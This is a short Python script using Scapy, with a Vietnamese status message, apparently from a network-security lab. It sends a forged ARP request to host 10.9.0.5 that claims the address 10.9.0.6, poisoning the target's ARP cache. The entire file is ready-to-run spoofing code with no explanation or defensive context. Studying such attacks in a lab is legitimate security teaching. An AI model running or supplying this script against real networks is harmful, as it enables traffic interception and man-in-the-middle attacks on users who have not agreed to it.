#!/usr/bin/python3
from scapy.all import *

E = Ether()
A = ARP()

E.dst = '02:42:0a:09:00:05' 

A.op = 1                        
A.psrc = '10.9.0.6'            
A.pdst = '10.9.0.5'           
A.hwdst = '02:42:0a:09:00:05'  

pkt = E/A
print("Dang gui goi tin ARP Request gia mao den May A...")
sendp(pkt)
